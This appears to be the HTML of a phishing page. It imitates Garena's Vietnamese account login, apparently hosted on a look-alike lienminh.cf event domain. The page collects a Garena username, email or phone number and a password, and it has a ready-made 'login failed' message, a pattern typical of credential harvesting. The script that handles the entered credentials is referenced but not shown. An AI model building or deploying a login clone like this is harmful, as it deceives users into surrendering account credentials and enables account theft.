<!DOCTYPE html>
<html>
<head>
	<title>Garena Account Center</title>
	<meta property="og:image" content="https://sukien.lienminh.cf/sources/images/background.png">
	<meta property="og:description" content="LOL là một tựa game rác, đạo nhái Liên Quân, là sản phẩm để PR cho serie Cinematic cùng với các MV ca nhạc của Riot Entertainment"/>
	<meta property="og:title" content="League of Liên Quân">
	<link rel="stylesheet" href="styles/style.css">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="shortcut icon" href="./sources/images/fav.jpg">
</head>
<body>
	<div id="header">
		<img src="sources/images/img_garena_logo.png" id="logo">
		<div id="langs">
			
		</div>
	</div>
	<div id="container">
		<div id="main">
			<h2>Đăng nhập</h2>
			<input type="text" id="username" placeholder="Tài khoản Garena, Email hoặc số điện thoại" autofocus>
			<input type="password" id="password" placeholder="Mật khẩu">
			<a href="#" id="login-btn"><div id="login" class="btn">Đăng Nhập Ngay</div></a>
			<div class="separator">
				<div class="line"></div>
				<div class="text">hoặc</div>
				<div class="line"></div>
			</div>
			<a href="#" id="register-btn"><div id="register" class="btn">Tạo tài khoản mới</div></a>
			<center><a href="#" id="forgot">Quên mật khẩu?</a></center>
		</div>
	</div>
	<div id="noti-box">
		<div id="noti">
			<div class="icon">
				<img id="loginStatus" src="sources/images/checklogin.svg">
			</div>
			<div class="content">Đăng nhập thất bại: sai tên tài khoản hoặc mật khẩu</div>
			<div class="close-noti">
				<div id="close-btn">Đóng</div>
			</div>
		</div>
	</div>
	<script src="scripts/script.js"></script>
</body>
</html>
